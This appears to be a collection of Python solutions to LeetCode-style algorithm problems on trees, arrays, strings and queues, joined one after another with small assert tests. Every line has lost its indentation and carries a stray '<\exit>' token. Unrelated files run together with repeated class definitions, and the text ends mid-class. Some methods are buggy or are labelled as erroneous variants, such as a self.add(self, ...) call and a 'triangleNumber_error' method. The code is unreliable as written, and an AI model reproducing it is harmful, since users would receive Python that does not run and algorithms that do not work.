def findTilt(self, root: TreeNode) -> int:<\exit>
ret = [0]<\exit>
self.walk(root, ret)<\exit>
return ret[0]<\exit>
def walk(self, node: TreeNode, ret) -> int:<\exit>
if not node:<\exit>
return 0<\exit>
l = self.walk(node.left, ret)<\exit>
r = self.walk(node.right, ret)<\exit>
ret[0] += abs(l - r)<\exit>
return l + node.val + r<\exit>
from typing import List<\exit>
class Solution:<\exit>
def arrayNesting(self, nums: List[int]) -> int:<\exit>
visited = set()<\exit>
ret = 0<\exit>
for n in nums:<\exit>
count = self.dfs(nums, n, set(), visited)<\exit>
ret = max(ret, count)<\exit>
return ret<\exit>
def dfs(self, nums, num, path, visited):<\exit>
if num in visited:<\exit>
return 0<\exit>
visited.add(num)<\exit>
path.add(num)<\exit>
self.dfs(nums, nums[num], path, visited)<\exit>
return len(path)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().arrayNesting([5,4,0,3,1,6,2]) == 4<\exit>
from typing import List<\exit>
class Solution:<\exit>
def matrixReshape(self, nums: List[List[int]], r: int, c: int) -> List[List[int]]:<\exit>
m, n = len(nums), len(nums[0])<\exit>
if m * n != r * c:<\exit>
return nums<\exit>
ret = []<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
if (i * n + j) % c == 0:<\exit>
ret.append([])<\exit>
ret[-1].append(nums[i][j])<\exit>
return ret<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def checkInclusion(self, s1: str, s2: str) -> bool:<\exit>
counter = defaultdict(int)<\exit>
s1_set = set(s1)<\exit>
for c in s1:<\exit>
counter[c] += 1<\exit>
i = 0<\exit>
j = 0<\exit>
while j < len(s2):<\exit>
if counter[s2[j]] > 0:<\exit>
counter[s2[j]] -= 1<\exit>
if j - i + 1 == len(s1):<\exit>
return True<\exit>
j += 1<\exit>
else:<\exit>
if s2[i] in s1_set:<\exit>
counter[s2[i]] += 1<\exit>
i += 1<\exit>
if j < i:<\exit>
j = i<\exit>
return False<\exit>
if __name__ == "__main__":<\exit>
assert Solution().checkInclusion("ab", "eidbaooo") == True<\exit>
assert Solution().checkInclusion("ab", "eidboaoo") == False<\exit>
MOD = 10 ** 9 + 7<\exit>
dirs = ((0, 1), (0, -1), (1, 0), (-1, 0))<\exit>
class Solution:<\exit>
def findPaths(self, m: int, n: int, N: int, r: int, c: int) -> int:<\exit>
ret = 0<\exit>
F = [[0 for _ in range(n)] for _ in range(m)]<\exit>
F[r][c] = 1<\exit>
for _ in range(N):<\exit>
F_new = [[0 for _ in range(n)] for _ in range(m)]<\exit>
for i in range(m):<\exit>
for j in range(n):<\exit>
for di, dj in dirs:<\exit>
I = i + di<\exit>
J = j + dj<\exit>
if 0 <= I < m and 0 <= J < n:<\exit>
F_new[I][J] = (F_new[I][J] + F[i][j]) % MOD<\exit>
else:<\exit>
ret = (ret + F[i][j]) % MOD<\exit>
F = F_new<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findPaths(2, 2, 2, 0, 0) == 6<\exit>
assert Solution().findPaths(1, 3, 3, 0, 1) == 12<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findUnsortedSubarray(self, nums: List[int]) -> int:<\exit>
n = len(nums)<\exit>
lo, hi = 0, n - 1<\exit>
while lo < hi and nums[lo] <= nums[lo + 1]:<\exit>
lo += 1<\exit>
while lo < hi and nums[hi - 1] <= nums[hi]:<\exit>
hi -= 1<\exit>
if hi <= lo:<\exit>
return 0<\exit>
mini = float('inf')<\exit>
maxa = -float('inf')<\exit>
for i in range(lo, hi + 1):<\exit>
mini = min(mini, nums[i])<\exit>
maxa = max(maxa, nums[i])<\exit>
while lo - 1 >= 0 and nums[lo - 1] > mini:<\exit>
lo -= 1<\exit>
while hi + 1 < n and nums[hi + 1] < maxa:<\exit>
hi += 1<\exit>
return hi - lo + 1<\exit>
def findUnsortedSubarray_sort(self, nums: List[int]) -> int:<\exit>
expected = list(sorted(nums))<\exit>
i = 0<\exit>
while i < len(nums) and nums[i] == expected[i]:<\exit>
i += 1<\exit>
j = len(nums) - 1<\exit>
while j >= i and nums[j] == expected[j]:<\exit>
j -= 1<\exit>
return j - i + 1<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findUnsortedSubarray([2, 1]) == 2<\exit>
assert Solution().findUnsortedSubarray([2, 6, 4, 8, 10, 9, 15]) == 5<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def minDistance(self, word1: str, word2: str) -> int:<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
m = len(word1)<\exit>
n = len(word2)<\exit>
for i in range(1, m + 1):<\exit>
for j in range(1, n + 1):<\exit>
if word1[i-1] == word2[j-1]:<\exit>
F[i][j] = F[i-1][j-1] + 1<\exit>
else:<\exit>
F[i][j] = max(<\exit>
F[i-1][j],<\exit>
F[i][j-1],<\exit>
)<\exit>
return m - F[m][n] + n - F[m][n]<\exit>
def minDistance_edit_distance(self, word1: str, word2: str) -> int:<\exit>
F = defaultdict(lambda: defaultdict(int))<\exit>
m = len(word1)<\exit>
n = len(word2)<\exit>
for i in range(1, m + 1):<\exit>
F[i][0] = i<\exit>
for j in range(1, n + 1):<\exit>
F[0][j] = j<\exit>
for i in range(1, m + 1):<\exit>
for j in range(1, n + 1):<\exit>
if word1[i-1] == word2[j-1]:<\exit>
F[i][j] = F[i-1][j-1]<\exit>
else:<\exit>
F[i][j] = min(<\exit>
F[i-1][j] + 1,<\exit>
F[i][j-1] + 1,<\exit>
)<\exit>
return F[m][n]<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minDistance("sea", "eat") == 2<\exit>
class Node:<\exit>
def __init__(self, val, children):<\exit>
self.val = val<\exit>
self.children = children<\exit>
from typing import List<\exit>
class Solution:<\exit>
def preorder(self, root: "Node") -> List[int]:<\exit>
ret = []<\exit>
if not root:<\exit>
return ret<\exit>
stk = [root]<\exit>
while stk:<\exit>
cur = stk.pop()<\exit>
ret.append(cur.val)<\exit>
for c in reversed(cur.children):<\exit>
stk.append(c)<\exit>
return ret<\exit>
class Node:<\exit>
def __init__(self, val, children):<\exit>
self.val = val<\exit>
self.children = children<\exit>
from typing import List<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def postorder(self, root: 'Node') -> List[int]:<\exit>
if not root:<\exit>
return []<\exit>
ret = deque()<\exit>
stk = [root]<\exit>
visited = set()<\exit>
while stk:<\exit>
cur = stk.pop()<\exit>
ret.appendleft(cur.val)<\exit>
for c in cur.children:<\exit>
stk.append(c)<\exit>
return list(ret)<\exit>
def postorder_visited(self, root: 'Node') -> List[int]:<\exit>
ret = []<\exit>
if not root:<\exit>
return ret<\exit>
stk = [root]<\exit>
visited = set()<\exit>
while stk:<\exit>
cur = stk[-1]<\exit>
if cur in visited:<\exit>
stk.pop()<\exit>
ret.append(cur.val)<\exit>
else:<\exit>
visited.add(cur)<\exit>
for c in reversed(cur.children):<\exit>
stk.append(c)<\exit>
return ret<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def findLHS(self, nums: List[int]) -> int:<\exit>
counter = defaultdict(int)<\exit>
for n in nums:<\exit>
counter[n] += 1<\exit>
ret = 0<\exit>
for k, v in counter.items():<\exit>
if k + 1 in counter:<\exit>
ret = max(ret, v + counter[k + 1])<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findRestaurant(self, list1: List[str], list2: List[str]) -> List[str]:<\exit>
index = {}<\exit>
for i, v in enumerate(list2):<\exit>
index[v] = i<\exit>
ret = []<\exit>
mini = float('inf')<\exit>
for i, v in enumerate(list1):<\exit>
if v in index:<\exit>
cur = i + index[v]<\exit>
if cur < mini:<\exit>
mini = cur<\exit>
ret = [v]<\exit>
elif cur == mini:<\exit>
ret.append(v)<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def canPlaceFlowers(self, flowerbed: List[int], n: int) -> bool:<\exit>
if n == 0:<\exit>
return True<\exit>
for i in range(len(flowerbed)):<\exit>
if (<\exit>
flowerbed[i] != 1 and<\exit>
(i + 1 >= len(flowerbed) or flowerbed[i+1] != 1) and<\exit>
(i - 1 < 0 or flowerbed[i - 1] != 1)<\exit>
):<\exit>
n -= 1<\exit>
flowerbed[i] = 1<\exit>
if n == 0:<\exit>
return True<\exit>
return False<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def tree2str(self, t: TreeNode) -> str:<\exit>
if not t:<\exit>
return ""<\exit>
left = self.tree2str(t.left)<\exit>
right = self.tree2str(t.right)<\exit>
ret = [str(t.val)]<\exit>
if left or right:<\exit>
ret.append("(" + left + ")")<\exit>
if right:<\exit>
ret.append("(" + right + ")")<\exit>
return "".join(ret)<\exit>
from typing import List<\exit>
class Solution:<\exit>
def triangleNumber(self, nums: List[int]) -> int:<\exit>
ret = 0<\exit>
nums.sort()<\exit>
n = len(nums)<\exit>
for k in range(n-1, 1, -1):<\exit>
i = 0<\exit>
j = k - 1<\exit>
while i < j:<\exit>
if nums[i] + nums[j] > nums[k]:<\exit>
ret += j - i<\exit>
j -= 1<\exit>
else:<\exit>
i += 1<\exit>
return ret<\exit>
def triangleNumber_error(self, nums: List[int]) -> int:<\exit>
ret = 0<\exit>
nums.sort()<\exit>
n = len(nums)<\exit>
for i in range(n - 2):<\exit>
j = i + 1<\exit>
k = n - 1<\exit>
while j < k:<\exit>
if nums[i] + nums[j] > nums[k]:<\exit>
ret += k - j<\exit>
k -= 1<\exit>
else:<\exit>
j += 1<\exit>
return ret<\exit>
def triangleNumber_slow(self, nums: List[int]) -> int:<\exit>
cache = {}<\exit>
nums.sort()<\exit>
n = len(nums)<\exit>
ret = 0<\exit>
for i in range(n):<\exit>
for j in range(i + 1, n):<\exit>
if (i, j) not in cache:<\exit>
cur = 0<\exit>
for k in range(j + 1, n):<\exit>
if nums[k] < nums[i] + nums[j]:<\exit>
cur += 1<\exit>
else:<\exit>
break<\exit>
cache[(i, j)] = cur<\exit>
ret += cache[(i, j)]<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().triangleNumber([2,2,3,4]) == 3<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def mergeTrees(self, t1: TreeNode, t2: TreeNode) -> TreeNode:<\exit>
if not t1 and not t2:<\exit>
return<\exit>
node = TreeNode(0)<\exit>
node.val += t1 and t1.val or 0<\exit>
node.val += t2 and t2.val or 0<\exit>
node.left = self.mergeTrees(t1 and t1.left, t2 and t2.left)<\exit>
node.right = self.mergeTrees(t1 and t1.right, t2 and t2.right)<\exit>
return node<\exit>
from typing import List<\exit>
from collections import deque, defaultdict<\exit>
import heapq<\exit>
class Solution:<\exit>
def leastInterval(self, tasks: List[str], n: int) -> int:<\exit>
counter = defaultdict(int)<\exit>
for t in tasks:<\exit>
counter[t] += 1<\exit>
maxa = 0<\exit>
max_cnt = 0<\exit>
for v in counter.values():<\exit>
if v > maxa:<\exit>
maxa = v<\exit>
max_cnt = 1<\exit>
elif v == maxa:<\exit>
max_cnt += 1<\exit>
page_cnt = maxa - 1<\exit>
free_page_size = n + 1 - max_cnt<\exit>
small_tasks = len(tasks) - max_cnt * maxa<\exit>
idle = max(0, page_cnt * free_page_size - small_tasks)<\exit>
return len(tasks) + idle<\exit>
def leastInterval_complicated(self, tasks: List[str], n: int) -> int:<\exit>
counter = defaultdict(int)<\exit>
for t in tasks:<\exit>
counter[t] += 1<\exit>
pq = [<\exit>
(-v, k)<\exit>
for k, v in counter.items()<\exit>
]<\exit>
heapq.heapify(pq)<\exit>
q = deque()<\exit>
clock = 0<\exit>
while pq or q:<\exit>
if q and q[0][0] <= clock:<\exit>
_, k = q.popleft()<\exit>
heapq.heappush(pq, (-counter[k], k))<\exit>
if pq:<\exit>
_, k = heapq.heappop(pq)<\exit>
counter[k] -= 1<\exit>
if counter[k] > 0:<\exit>
q.append((clock + 1 + n, k))<\exit>
clock += 1<\exit>
return clock<\exit>
if __name__ == "__main__":<\exit>
assert Solution().leastInterval(["A","A","A","B","B","B"], 0) == 6<\exit>
assert Solution().leastInterval(["A","A","A","B","B","B"], 2) == 8<\exit>
class MyCircularQueue:<\exit>
def __init__(self, k: int):<\exit>
self.head = 0<\exit>
self.tail = -1<\exit>
self.sz = 0<\exit>
self.k = k<\exit>
self.lst = [None for _ in range(k)]<\exit>
def enQueue(self, value: int) -> bool:<\exit>
if self.sz >= self.k:<\exit>
return False<\exit>
self.tail += 1<\exit>
self.lst[self.tail % self.k] = value<\exit>
self.sz += 1<\exit>
return True<\exit>
def deQueue(self) -> bool:<\exit>
if self.sz <= 0:<\exit>
return False<\exit>
self.lst[self.head % self.k] = None<\exit>
self.head += 1<\exit>
self.sz -= 1<\exit>
return True<\exit>
def Front(self) -> int:<\exit>
ret = self.lst[self.head % self.k]<\exit>
return ret if ret is not None else -1<\exit>
def Rear(self) -> int:<\exit>
ret = self.lst[self.tail % self.k]<\exit>
return ret if ret is not None else -1<\exit>
def isEmpty(self) -> bool:<\exit>
return self.sz == 0<\exit>
def isFull(self) -> bool:<\exit>
return self.sz == self.k<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def addOneRow(self, root: TreeNode, v: int, d: int) -> TreeNode:<\exit>
return self.add(root, v, d, 1, "left")<\exit>
def add(self, node, v, d, cur_d, child) -> TreeNode:<\exit>
if cur_d == d:<\exit>
new = TreeNode(v)<\exit>
setattr(new, child, node)<\exit>
return new<\exit>
if node:<\exit>
node.left = self.add(node.left, v, d, cur_d + 1, "left")<\exit>
node.right = self.add(node.right, v, d, cur_d + 1, "right")<\exit>
return node<\exit>
class Solution2:<\exit>
def addOneRow(self, root: TreeNode, v: int, d: int) -> TreeNode:<\exit>
if d == 1:<\exit>
node = TreeNode(v)<\exit>
node.left = root<\exit>
return node<\exit>
self.add(self, root, v, d, 1)<\exit>
return root<\exit>
def add(self, node, v, d, cur_d) -> None:<\exit>
if not node:<\exit>
return<\exit>
if cur_d + 1 == d:<\exit>
left = node.left<\exit>
right = node.right<\exit>
node.left = TreeNode(v)<\exit>
node.left.left = left<\exit>
node.right = TreeNode(v)<\exit>
node.right.right = right<\exit>
self.add(node.left, v, d, cur_d + 1)<\exit>
self.add(node.right, v, d, cur_d + 1)<\exit>
import heapq<\exit>
from typing import List<\exit>
class Solution:<\exit>
def maximumProduct(self, nums: List[int]) -> int:<\exit>
mxes = heapq.nlargest(3, nums)<\exit>
mns = heapq.nsmallest(3, nums)<\exit>
return max(<\exit>
mxes[0] * mxes[1] * mxes[2],<\exit>
mns[0] * mns[1] * mxes[0],<\exit>
)<\exit>
import bisect<\exit>
class LogSystem:<\exit>
def __init__(self):<\exit>
self.lst = []<\exit>
def put(self, id: int, timestamp: str) -> None:<\exit>
bisect.insort(self.lst, (timestamp, id))<\exit>
def retrieve(self, s: str, e: str, gra: str) -> List[int]:<\exit>
lo = "0001:01:01:00:00:00"<\exit>
hi = "9999:12:31:23:59:59"<\exit>
pre = {<\exit>
"Year": 4,<\exit>
"Month": 7,<\exit>
"Day": 10,<\exit>
"Hour": 13,<\exit>
"Minute": 16,<\exit>
"Second": 19,<\exit>
}[gra]<\exit>
s = s[:pre] + lo[pre:]<\exit>
e = e[:pre] + hi[pre:]<\exit>
i = bisect.bisect_left(self.lst, (s, 0))<\exit>
j = bisect.bisect_right(self.lst, (e, float("inf")))<\exit>
return [id for _, id in self.lst[i:j]]<\exit>
from typing import List<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def averageOfLevels(self, root: TreeNode) -> List[float]:<\exit>
ret = []<\exit>
if not root:<\exit>
return ret<\exit>
q = [root]<\exit>
while q:<\exit>
n = len(q)<\exit>
avg = sum(map(lambda node: node.val, q)) / n<\exit>
ret.append(avg)<\exit>
cur_q = []<\exit>
for node in q:<\exit>
if node.left:<\exit>
cur_q.append(node.left)<\exit>
if node.right:<\exit>
cur_q.append(node.right)<\exit>
q = cur_q<\exit>
return ret<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findMaxAverage(self, nums: List[int], k: int) -> float:<\exit>
cur_sum = sum(nums[:k])<\exit>
maxa = cur_sum<\exit>
i = k<\exit>
while i < len(nums):<\exit>
cur_sum += nums[i]<\exit>
cur_sum -= nums[i-k]<\exit>
maxa = max(maxa, cur_sum)<\exit>
i += 1<\exit>
return maxa / k<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findErrorNums(self, nums: List[int]) -> List[int]:<\exit>
n = len(nums)<\exit>
acc0 = 0<\exit>
for i in range(n):<\exit>
acc0 ^= nums[i]<\exit>
acc0 ^= i + 1<\exit>
first_1 = acc0 & - acc0<\exit>
acc1 = 0<\exit>
acc2 = 0<\exit>
for i in range(n):<\exit>
if nums[i] & first_1:<\exit>
acc1 ^= nums[i]<\exit>
else:<\exit>
acc2 ^= nums[i]<\exit>
if (i + 1) & first_1:<\exit>
acc1 ^= i + 1<\exit>
else:<\exit>
acc2 ^= i + 1<\exit>
for i in range(n):<\exit>
if nums[i] == acc1:<\exit>
return [acc1, acc2]<\exit>
return [acc2, acc1]<\exit>
from typing import List<\exit>
class Solution:<\exit>
def findLongestChain(self, pairs: List[List[int]]) -> int:<\exit>
pairs.sort(key=lambda x: x[1])<\exit>
n = len(pairs)<\exit>
ret = 0<\exit>
cur_end = -float("inf")<\exit>
for i in range(n):<\exit>
if pairs[i][0] <= cur_end:<\exit>
continue<\exit>
cur_end = pairs[i][1]<\exit>
ret += 1<\exit>
return ret<\exit>
def findLongestChain2(self, pairs: List[List[int]]) -> int:<\exit>
pairs.sort(key=lambda x: x[1])<\exit>
n = len(pairs)<\exit>
ret = 0<\exit>
i = 0<\exit>
while i < n:<\exit>
ret += 1<\exit>
cur_end = pairs[i][1]<\exit>
i += 1<\exit>
while i < n and pairs[i][0] <= cur_end:<\exit>
i += 1<\exit>
return ret<\exit>
class Solution2:<\exit>
def findLongestChain(self, pairs: List[List[int]]) -> int:<\exit>
pairs.sort(key=lambda x: tuple(x))<\exit>
n = len(pairs)<\exit>
F = [1 for _ in range(n)]<\exit>
for i in range(n):<\exit>
for j in range(i):<\exit>
if pairs[j][1] < pairs[i][0]:<\exit>
F[i] = max(F[i], F[j] + 1)<\exit>
return max(F)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findLongestChain([[1,2], [2,3], [3,4]]) == 2<\exit>
from collections import defaultdict<\exit>
class Solution:<\exit>
def countSubstrings(self, s):<\exit>
F = defaultdict(lambda: defaultdict(bool))<\exit>
n = len(s)<\exit>
for i in range(n):<\exit>
F[i][i] = True<\exit>
F[i][i+1] = True<\exit>
for i in range(n-1, -1, -1):<\exit>
for j in range(i+2, n+1):<\exit>
if s[i] == s[j-1]:<\exit>
F[i][j] = F[i+1][j-1]<\exit>
else:<\exit>
F[i][j] = False<\exit>
return sum(<\exit>
1<\exit>
for i in range(n)<\exit>
for j in range(i+1, n+1)<\exit>
if F[i][j]<\exit>
)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().countSubstrings("aaa") == 6<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class Node:<\exit>
def __init__(self, chr):<\exit>
self.chr = chr<\exit>
self.ended = False<\exit>
self.children = defaultdict(lambda: None)<\exit>
class Trie:<\exit>
def __init__(self):<\exit>
self.root = Node(None)<\exit>
@classmethod<\exit>
def insert(cls, node, w, i):<\exit>
if not node:<\exit>
node = Node(w[i])<\exit>
if i == len(w) - 1:<\exit>
node.ended = True<\exit>
else:<\exit>
nxt = w[i + 1]<\exit>
node.children[nxt] = cls.insert(node.children[nxt], w, i + 1)<\exit>
return node<\exit>
@classmethod<\exit>
def search(cls, node, w, i):<\exit>
if not node:<\exit>
return<\exit>
if node.chr != w[i]:<\exit>
return<\exit>
if node.ended:<\exit>
return w[:i+1]<\exit>
elif i + 1 < len(w):<\exit>
return cls.search(node.children[w[i + 1]], w, i + 1)<\exit>
else:<\exit>
return<\exit>
class Solution:<\exit>
def replaceWords(self, dic: List[str], sentence: str) -> str:<\exit>
trie = Trie()<\exit>
for word in dic:<\exit>
root = trie.root<\exit>
root.children[word[0]] = Trie.insert(root.children[word[0]], word, 0)<\exit>
ret = []<\exit>
for word in sentence.split(" "):<\exit>
for child in trie.root.children.values():<\exit>
searched = Trie.search(child, word, 0)<\exit>
if searched:<\exit>
ret.append(searched)<\exit>
break<\exit>
else:<\exit>
ret.append(word)<\exit>
return " ".join(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().replaceWords(["cat", "bat", "rat"], "the cattle was rattled by the battery") == "the cat was rat by the bat"<\exit>
class Solution:<\exit>
def minSteps(self, n: int) -> int:<\exit>
ret = 0<\exit>
for i in range(2, n+1):<\exit>
while n % i == 0:<\exit>
ret += i<\exit>
n //= i<\exit>
return ret<\exit>
def minSteps_dp(self, n: int) -> int:<\exit>
F = [[float('inf') for _ in range(n+1)] for _ in range(n+1)]<\exit>
F[1][0] = 0<\exit>
F[1][1] = 1<\exit>
for i in range(2, n + 1):<\exit>
for j in range(i+1):<\exit>
F[i][j] = min(<\exit>
F[i][j],<\exit>
F[i-j][j] + 1,<\exit>
)<\exit>
if i % 2 == 0:<\exit>
F[i][i//2] = min(<\exit>
F[i][i//2],<\exit>
F[i//2][j] + 2<\exit>
)<\exit>
ret = min(F[n])<\exit>
return ret<\exit>
if __name__ == "__main__":<\exit>
assert Solution().minSteps(7) == 7<\exit>
assert Solution().minSteps(3) == 3<\exit>
assert Solution().minSteps(4) == 4<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
class MerkleHash:<\exit>
def __init__(self):<\exit>
self.start_key = 0<\exit>
self.merkle_hash = defaultdict(self._auto_incr)<\exit>
def _auto_incr(self):<\exit>
self.start_key += 1<\exit>
return self.start_key<\exit>
def __call__(self, val):<\exit>
return self.merkle_hash[val]<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.counter = defaultdict(int)<\exit>
self.merkle_hash = MerkleHash()<\exit>
def findDuplicateSubtrees(self, root: TreeNode) -> List[TreeNode]:<\exit>
ret = []<\exit>
self.walk(root, ret)<\exit>
return ret<\exit>
def walk(self, cur, ret) -> int:<\exit>
if not cur:<\exit>
return self.merkle_hash(None)<\exit>
subtree_value = (cur.val, self.walk(cur.left, ret), self.walk(cur.right, ret))<\exit>
merkle_hash = self.merkle_hash(subtree_value)<\exit>
if self.counter[merkle_hash] == 1:<\exit>
ret.append(cur)<\exit>
self.counter[merkle_hash] += 1<\exit>
return merkle_hash<\exit>
class Solution2:<\exit>
def findDuplicateSubtrees(self, root: TreeNode) -> List[TreeNode]:<\exit>
ret = []<\exit>
self.walk(root, defaultdict(int), ret)<\exit>
return ret<\exit>
def walk(self, cur, counter, ret) -> str:<\exit>
if not cur:<\exit>
return "None"<\exit>
cur_key = ",".join([<\exit>
self.walk(cur.left, counter, ret),<\exit>
self.walk(cur.right, counter, ret),<\exit>
str(cur.val),<\exit>
])<\exit>
if counter[cur_key] == 1:<\exit>
ret.append(cur)<\exit>
counter[cur_key] += 1<\exit>
return cur_key<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def findTarget(self, root: TreeNode, k: int) -> bool:<\exit>
self.root = root<\exit>
return self.walk(root, k)<\exit>
def walk(self, node, k):<\exit>
if not node:<\exit>
return False<\exit>
target = k - node.val<\exit>
if self.find(self.root, target, node):<\exit>
return True<\exit>
if self.walk(node.left, k) or self.walk(node.right, k):<\exit>
return True<\exit>
return False<\exit>
def find(self, node, target, existing):<\exit>
if not node:<\exit>
return False<\exit>
if node.val == target:<\exit>
return node != existing<\exit>
if target < node.val:<\exit>
return self.find(node.left, target, existing)<\exit>
else:<\exit>
return self.find(node.right, target, existing)<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
from typing import List<\exit>
import heapq<\exit>
class Solution:<\exit>
def constructMaximumBinaryTree(self, nums: List[int]) -> TreeNode:<\exit>
stk = []<\exit>
for n in nums:<\exit>
cur = TreeNode(n)<\exit>
while stk and stk[-1].val < cur.val:<\exit>
left = stk.pop()<\exit>
cur.left = left<\exit>
if stk:<\exit>
stk[-1].right = cur<\exit>
stk.append(cur)<\exit>
return stk[0]<\exit>
class Solution_heap:<\exit>
def constructMaximumBinaryTree(self, nums: List[int]) -> TreeNode:<\exit>
if not nums:<\exit>
return<\exit>
h = [(-v, v) for v in nums]<\exit>
idx = {<\exit>
v: i<\exit>
for i, v in enumerate(nums)<\exit>
}<\exit>
heapq.heapify(h)<\exit>
root = None<\exit>
while h:<\exit>
_, m = heapq.heappop(h)<\exit>
root = self.insert(root, m, idx)<\exit>
return root<\exit>
def insert(self, node, m, idx):<\exit>
if not node:<\exit>
return TreeNode(m)<\exit>
if idx[m] < idx[node.val]:<\exit>
node.left = self.insert(node.left, m, idx)<\exit>
elif idx[m] > idx[node.val]:<\exit>
node.right = self.insert(node.right, m, idx)<\exit>
else:<\exit>
raise<\exit>
return node<\exit>
from collections import Counter<\exit>
class Solution:<\exit>
def judgeCircle(self, moves: str) -> bool:<\exit>
counter = Counter(moves)<\exit>
return counter["L"] == counter["R"] and counter["U"] == counter["D"]<\exit>
from typing import List<\exit>
from bisect import bisect_left<\exit>
from collections import deque<\exit>
class Solution:<\exit>
def findClosestElements(self, A: List[int], k: int, x: int) -> List[int]:<\exit>
n = len(A)<\exit>
lo = 0<\exit>
hi = n - k<\exit>
while lo < hi:<\exit>
mid = (lo + hi) // 2<\exit>
if abs(x - A[mid]) > abs(A[mid + k] - x):<\exit>
lo = mid + 1<\exit>
else:<\exit>
hi = mid<\exit>
return A[lo:lo+k]<\exit>
def findClosestElements2(self, A: List[int], k: int, x: int) -> List[int]:<\exit>
n = len(A)<\exit>
idx = bisect_left(A, x)<\exit>
ret = deque()<\exit>
i = idx - 1<\exit>
j = idx<\exit>
while k:<\exit>
if 0 <= i < n and 0 <= j < n:<\exit>
if abs(A[i] - x) <= abs(A[j] - x):<\exit>
ret.appendleft(A[i])<\exit>
i -= 1<\exit>
else:<\exit>
ret.append(A[j])<\exit>
j += 1<\exit>
elif 0 <= i < n:<\exit>
ret.appendleft(A[i])<\exit>
i -= 1<\exit>
elif 0 <= j < n:<\exit>
ret.append(A[j])<\exit>
j += 1<\exit>
else:<\exit>
raise<\exit>
k -= 1<\exit>
return list(ret)<\exit>
if __name__ == "__main__":<\exit>
assert Solution().findClosestElements([1,2,3,4,5], 4, 3) == [1,2,3,4]<\exit>
assert Solution().findClosestElements([1,2,3,4,5], 4, -1) == [1,2,3,4]<\exit>
from typing import List<\exit>
from collections import defaultdict<\exit>
import heapq<\exit>
class Solution:<\exit>
def isPossible(self, nums: List[int]) -> bool:<\exit>
counter = defaultdict(int)<\exit>
for e in nums:<\exit>
counter[e] += 1<\exit>
F = defaultdict(int)<\exit>
for e in nums:<\exit>
if counter[e] == 0:<\exit>
continue<\exit>
counter[e] -= 1<\exit>
if F[e - 1] > 0:<\exit>
F[e - 1] -= 1<\exit>
F[e] += 1<\exit>
elif counter[e + 1] > 0 and counter[e + 2] > 0:<\exit>
F[e + 2] += 1<\exit>
counter[e + 1] -= 1<\exit>
counter[e + 2] -= 1<\exit>
else:<\exit>
return False<\exit>
return True<\exit>
class Interval:<\exit>
def __init__(self, end, length):<\exit>
self.end = end<\exit>
self.length = length<\exit>
def __lt__(self, other):<\exit>
if self.end == other.end:<\exit>
return self.length < other.length<\exit>
return self.end < other.end<\exit>
def __repr__(self):<\exit>
return repr((self.end, self.length))<\exit>
class Solution2:<\exit>
def isPossible(self, nums: List[int]) -> bool:<\exit>
h = []<\exit>
for n in nums:<\exit>
while h and h[0].end + 1 < n:<\exit>
itvl = heapq.heappop(h)<\exit>
if itvl.length < 3:<\exit>
return False<\exit>
if not h:<\exit>
heapq.heappush(h, Interval(n, 1))<\exit>
elif h[0].end + 1 == n:<\exit>
itvl = heapq.heappop(h)<\exit>
heapq.heappush(h, Interval(n, itvl.length + 1))<\exit>
else:<\exit>
heapq.heappush(h, Interval(n, 1))<\exit>
for itvl in h:<\exit>
if itvl.length < 3:<\exit>
return False<\exit>
return True<\exit>
if __name__ == "__main__":<\exit>
assert Solution().isPossible([1,2,3,3,4,5]) == True<\exit>
assert Solution().isPossible([1,2,3,3,4,4,5,5]) == True<\exit>
assert Solution().isPossible([1,2,3,4,4,5]) == False<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def widthOfBinaryTree(self, root: TreeNode) -> int:<\exit>
if not root:<\exit>
return 0<\exit>
ret = 0<\exit>
q = [(0, root)]<\exit>
while q:<\exit>
cur_q = []<\exit>
left, right = q[0][0], q[-1][0]<\exit>
ret = max(ret, right - left + 1)<\exit>
for idx, node in q:<\exit>
if node.left:<\exit>
cur_q.append((idx * 2, node.left))<\exit>
if node.right:<\exit>
cur_q.append((idx * 2 + 1, node.right))<\exit>
q = cur_q<\exit>
return ret<\exit>
class TreeNode:<\exit>
def __init__(self, x):<\exit>
self.val = x<\exit>
self.left = None<\exit>
self.right = None<\exit>
class Solution:<\exit>
def __init__(self):<\exit>
self.sums = []<\exit>
